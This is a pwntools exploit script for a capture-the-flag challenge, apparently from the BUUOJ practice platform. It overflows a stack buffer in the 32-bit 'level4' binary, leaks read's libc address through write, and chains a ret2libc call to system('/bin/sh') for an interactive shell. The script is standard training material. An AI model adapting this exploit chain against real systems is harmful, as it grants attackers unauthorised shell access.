from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='i386', os='linux', log_level = 'DEBUG')
binary = './level4'
elf = ELF(binary)
p = remote('node3.buuoj.cn',28107) if argv[1]=='r' else process(binary)

# start
payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4)
sl(payload)
read =uu64(r(4))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*(0x88+4),system,'a'*4,binsh)
sl(payload)
# end

itr()